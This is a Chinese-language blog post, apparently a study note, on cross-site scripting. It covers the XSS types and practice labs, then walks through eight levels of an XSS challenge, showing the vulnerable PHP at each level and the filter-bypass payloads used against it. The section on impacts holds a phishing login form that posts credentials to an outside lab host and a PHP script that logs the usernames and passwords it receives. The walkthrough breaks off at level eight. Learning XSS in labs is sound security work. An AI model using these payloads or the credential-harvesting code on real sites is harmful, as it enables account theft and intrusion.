<!DOCTYPE html>
<html>
  <head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
  <meta name="description" content="si1ent">
  <meta name="keyword" content="hexo-theme, vuejs">
  
    <link rel="shortcut icon" href="/css/images/logo.png">
  
  <title>
    
      XSS学习 | si1ent
    
  </title>
  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/css/plugins/gitment.css">

  
  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
  
    
<script src="/js/qrious.js"></script>

  
  
    
<script src="/js/gitment.js"></script>

  
  
  
    <!-- MathJax support START -->
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    <!-- MathJax support END -->
  


  
<meta name="generator" content="Hexo 5.2.0"></head>
<div class="wechat-share">
  <img src="/css/images/logo.png" />
</div>

  <body>
    <header class="header fixed-header">
  <div class="header-container">
    <a class="home-link" href="/">
      <div class="logo"></div>
      <span>si1ent</span>
    </a>
    <ul class="right-list">
      
        <li class="list-item">
          
            <a href="/" class="item-link">Home</a>
          
        </li>
      
        <li class="list-item">
          
            <a href="/tags/" class="item-link">Tags</a>
          
        </li>
      
        <li class="list-item">
          
            <a href="/archives/" class="item-link">Archives</a>
          
        </li>
      
        <li class="list-item">
          
            <a href="/about/" class="item-link">About</a>
          
        </li>
      
    </ul>
    <div class="menu">
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
    </div>
    <div class="menu-mask">
      <ul class="menu-list">
        
          <li class="menu-item">
            
              <a href="/" class="menu-link">Home</a>
            
          </li>
        
          <li class="menu-item">
            
              <a href="/tags/" class="menu-link">Tags</a>
            
          </li>
        
          <li class="menu-item">
            
              <a href="/archives/" class="menu-link">Archives</a>
            
          </li>
        
          <li class="menu-item">
            
              <a href="/about/" class="menu-link">About</a>
            
          </li>
        
      </ul>
    </div>
  </div>
</header>

    <div id="article-banner">
  <h2>XSS学习</h2>
  <p class="post-date">2020-09-05</p>
  <div class="arrow-down">
    <a href="javascript:;"></a>
  </div>
</div>
<main class="app-body flex-box">
  <!-- Article START -->
  <article class="post-article">
    <section class="markdown-content"><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>XSS：“Cross Site Scripting”：“跨站脚本攻击”，因和CSS（层叠样式表重名），因此被命名为XSS来表示”跨站脚本攻击”。</p>
<p>之前说到，既然出现安全问题，必然是外部用户输入恶意字符串而产生的（又可称为：攻击者对参数、输入点可控，同时服务器端对输入的值未经过滤、转义，导致攻击事件发生。）整体的安全事件必然也均这样的经过，漏洞如何<code>验证</code>、<code>影响范围</code>及<code>修复</code>需要我们慢慢学习整理。</p>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>因浏览器本身设计缺陷，而浏览器的主要工作是对用户请求的HTML+CSS+Javascript的解释执行，其以前部分浏览器在安全性这块并未做任何验证，导致服务器端对外提供访问后一旦部署相应应用系统，且未对用户提交数据进行过滤将产生XSS攻击。</p>
<p>本质是客户端代码注入攻击，代码类型基本属于前端类：HTML、Javascript、CSS等其他脚本组成。</p>
<h4 id="产生过程"><a href="#产生过程" class="headerlink" title="产生过程"></a>产生过程</h4><h5 id="反射型-非持久性"><a href="#反射型-非持久性" class="headerlink" title="反射型(非持久性)"></a>反射型(非持久性)</h5><ol>
<li>攻击者构造出特殊代码，其中包含恶意代码</li>
<li>用户打开带有恶意代码URL或网页，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器</li>
<li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行；会进行弹窗告警</li>
</ol>
<h5 id="存储型-持久性"><a href="#存储型-持久性" class="headerlink" title="存储型(持久性)"></a>存储型(持久性)</h5><ol>
<li>攻击者准备好接收Cookie平台</li>
<li>攻击者找到目标系统可留言、修改个人信息处</li>
<li>插入恶意代码及链接</li>
<li>管理员登录系统并对留言信息点击后会触发XSS漏洞</li>
<li>会把管理员登录的Cookie发送到接收平台</li>
<li>攻击者替换Cookie值进行访问，此时权限会提升至管理员</li>
</ol>
<h5 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h5><ol>
<li>攻击者构造Javascript或其他脚本</li>
<li>插入到指定位置(URL参数、其他个人信息或其他可修改位置)</li>
<li>点击触发漏洞，构造的恶意代码被执行</li>
<li>结果：可能会弹窗或其他操作</li>
</ol>
<h4 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h4><p>由以上了解，漏洞可按照以下形式进行分类：</p>
<h5 id="一、非持久型-反射型、DOM型"><a href="#一、非持久型-反射型、DOM型" class="headerlink" title="一、非持久型(反射型、DOM型)"></a>一、非持久型(反射型、DOM型)</h5><p>指不会一直影响系统，只有每次点击访问后会触发浏览器执行对应恶意代码并作出响应。</p>
<h5 id="二、持久型-存储型"><a href="#二、持久型-存储型" class="headerlink" title="二、持久型(存储型)"></a>二、持久型(存储型)</h5><p>指会一直留存于对应应用系统内，且如不删除操作会预留至系统内；一旦点击后会触发恶意代码，而且如不删除会每次点击都会触发。</p>
<h3 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><p>值得推荐的本地漏洞环境可参考如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DVWA:https:&#x2F;&#x2F;github.com&#x2F;digininja&#x2F;DVWA.git</span><br><span class="line">本地搭建XSS:https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;54041627</span><br><span class="line">bwapp:http:&#x2F;&#x2F;www.itsecgames.com&#x2F;</span><br><span class="line">其他环境待更新...</span><br></pre></td></tr></table></figure>

<h3 id="在线挑战"><a href="#在线挑战" class="headerlink" title="在线挑战"></a>在线挑战</h3><p>值得推荐的线上挑战赛：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2296</span><br><span class="line">https:&#x2F;&#x2F;xss-quiz.int21h.jp&#x2F;</span><br><span class="line">其他环境待更新...</span><br></pre></td></tr></table></figure>

<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>按不同类型分析对目标系统会产生哪些影响范围</p>
<h4 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h4><p>Cookie欺骗/Cookie会话攻击（提前搭建接收Cookie文件）</p>
<p>XSS History Hack(利用：getComputedStyle()方法)</p>
<h4 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h4><p>Cookie欺骗/Cookie会话攻击</p>
<p>会话劫持(Session/Cookie)</p>
<p>网络钓鱼</p>
<p>钓鱼脚本</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://xss-lab.me:8888/get.php&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Pass&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;login&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>记录信息</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data =fopen(<span class="string">&#x27;login.txt&#x27;</span>,<span class="string">&quot;a+&quot;</span>);</span><br><span class="line">$login = $_POST[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">$pass = $_POST[<span class="string">&quot;password&quot;</span>];</span><br><span class="line">fwrite($data,<span class="string">&quot;username:<span class="subst">$login</span>\n&quot;</span>);</span><br><span class="line">fwrite($data,<span class="string">&quot;password:<span class="subst">$pass</span>\n&quot;</span>);</span><br><span class="line">fclose($data);</span><br><span class="line">Header(<span class="string">&quot;location:login.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>下图记录用户提交请求</p>
<p><img src="/images/XSS/image-20200828105754440.png" alt="image-20200828105754440"></p>
<p>网页挂马(网页内嵌入script、或iframe等标签)</p>
<p>DOS或DDOS</p>
<h4 id="DOM型-1"><a href="#DOM型-1" class="headerlink" title="DOM型"></a>DOM型</h4><p>DOM型和反射型XSS类似因此不再重复写</p>
<h3 id="实战验证"><a href="#实战验证" class="headerlink" title="实战验证"></a>实战验证</h3><h4 id="反射型-1"><a href="#反射型-1" class="headerlink" title="反射型"></a>反射型</h4><p>反射型XSS使用网络检索得到一款源码搭建本地测试，反射型<code>payload</code></p>
<h5 id="挑战一"><a href="#挑战一" class="headerlink" title="挑战一"></a>挑战一</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//未编码</span><br><span class="line">`&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;`</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">//外部输入变量</span><br><span class="line"><span class="meta">$</span><span class="bash">str = <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span></span><br><span class="line">//变量值未经过滤直接输出</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><code>Result</code></p>
<p><img src="/images/XSS/image-20200828134439412.png" alt="image-20200828134439412"></p>
<h5 id="挑战二"><a href="#挑战二" class="headerlink" title="挑战二"></a>挑战二</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//初步测试,发现payload直接输出</span><br><span class="line">`&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;`</span><br></pre></td></tr></table></figure>

<p><img src="/images/XSS/image-20200828140956492.png" alt="image-20200828140956492"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//满足闭合,观察输入payload时输出</span><br><span class="line">`&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;`</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//对变量经过htmlspecialchars函数过滤</span><br><span class="line">&lt;?php </span><br><span class="line">ini_et(&quot;display_errors&quot;, 0);</span><br><span class="line"><span class="meta">$</span><span class="bash">str = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span></span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level2.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.$str.&#x27;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><code>Result</code></p>
<p><img src="/images/XSS/image-20200828140717307.png" alt="image-20200828140717307"></p>
<h5 id="挑战三"><a href="#挑战三" class="headerlink" title="挑战三"></a>挑战三</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//闭合测试，发现&gt;被转义了</span><br><span class="line">`&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;`</span><br></pre></td></tr></table></figure>

<p><img src="/images/XSS/image-20200828142634784.png" alt="image-20200828142634784"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//不使用&lt;等类似字符进行测试</span><br><span class="line">`&#x27;onmouseover=alert(1)//`</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//对变量经过两次htmlspecialchars函数过滤</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line"><span class="meta">$</span><span class="bash">str = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span></span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;</span><br><span class="line">&lt;form action=level3.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><code>Result</code></p>
<p><img src="/images/XSS/image-20200828143012943.png" alt="image-20200828143012943"></p>
<h5 id="挑战四"><a href="#挑战四" class="headerlink" title="挑战四"></a>挑战四</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//基础测试，发现对&lt;、&gt;进行替换为空</span><br><span class="line">`&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;`</span><br></pre></td></tr></table></figure>

<p><img src="/images/XSS/image-20200828143756092.png" alt="image-20200828143756092"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//不使用&lt;等类似字符进行测试</span><br><span class="line">`&quot;onmouseover=alert(1)//`</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;对输入变量值中&lt;、&gt;进行替换</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2&#x3D;str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level4.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str3.&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><code>Result</code></p>
<p><img src="/images/XSS/image-20200828144232008.png" alt="image-20200828144232008"></p>
<h5 id="挑战五"><a href="#挑战五" class="headerlink" title="挑战五"></a>挑战五</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//基础测试，发现对&lt;、&gt;进行替换为空</span><br><span class="line">`&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;`</span><br></pre></td></tr></table></figure>

<p><img src="/images/XSS/image-20200828150406623.png" alt="image-20200828150406623"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;&lt;script 转换成 &lt;scr_ipt ，on转换成 o_n</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2&#x3D;str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level5.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str3.&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//使用伪协议绕过</span><br><span class="line">`&quot;&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;`</span><br></pre></td></tr></table></figure>

<p><code>Result</code></p>
<p><img src="/images/XSS/image-20200828151240091.png" alt="image-20200828151240091"></p>
<h5 id="挑战六"><a href="#挑战六" class="headerlink" title="挑战六"></a>挑战六</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//使用伪协议绕过</span><br><span class="line">`&quot;&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;`</span><br></pre></td></tr></table></figure>

<p><img src="/images/XSS/image-20200828151906636.png" alt="image-20200828151906636"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;发现添加了多个属性进行过滤操作</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2&#x3D;str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4&#x3D;str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5&#x3D;str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6&#x3D;str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level6.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str6.&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//发现并未对大小写过滤，</span><br><span class="line">`&quot;&gt; &lt;a HrEf=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;`</span><br></pre></td></tr></table></figure>

<p><code>Result</code></p>
<p><img src="/images/XSS/image-20200828152455501.png" alt="image-20200828152455501"></p>
<h5 id="挑战七"><a href="#挑战七" class="headerlink" title="挑战七"></a>挑战七</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//使用大小写测试</span><br><span class="line">`&quot;&gt; &lt;a HrEf=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;`</span><br></pre></td></tr></table></figure>

<p><img src="/images/XSS/image-20200828152734820.png" alt="image-20200828152734820"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;添加script替换为空</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D;strtolower( $_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2&#x3D;str_replace(&quot;script&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;on&quot;,&quot;&quot;,$str2);</span><br><span class="line">$str4&#x3D;str_replace(&quot;src&quot;,&quot;&quot;,$str3);</span><br><span class="line">$str5&#x3D;str_replace(&quot;data&quot;,&quot;&quot;,$str4);</span><br><span class="line">$str6&#x3D;str_replace(&quot;href&quot;,&quot;&quot;,$str5);</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level7.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str6.&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//重复绕过,</span><br><span class="line">`&quot;&gt;&lt;sscriptcript&gt;alert(1)&lt;/sscriptcript&gt;`</span><br><span class="line">`&quot;oonnmouseover=alert(1)`</span><br><span class="line">`&quot;&gt;&lt;a hrhrefef=javascriscriptpt:alert(1)&gt;click&lt;/a&gt;`</span><br></pre></td></tr></table></figure>

<p><code>Result</code></p>
<p><img src="/images/XSS/image-20200828153152250.png" alt="image-20200828153152250"></p>
<h5 id="挑战八"><a href="#挑战八" class="headerlink" title="挑战八"></a>挑战八</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//重复测试</span><br><span class="line">`&quot;&gt;&lt;sscriptcript&gt;alert(1)&lt;/sscriptcript&gt;`</span><br></pre></td></tr></table></figure>

<p><img src="/images/XSS/image-20200828153930815.png" alt="image-20200828153930815"></p>
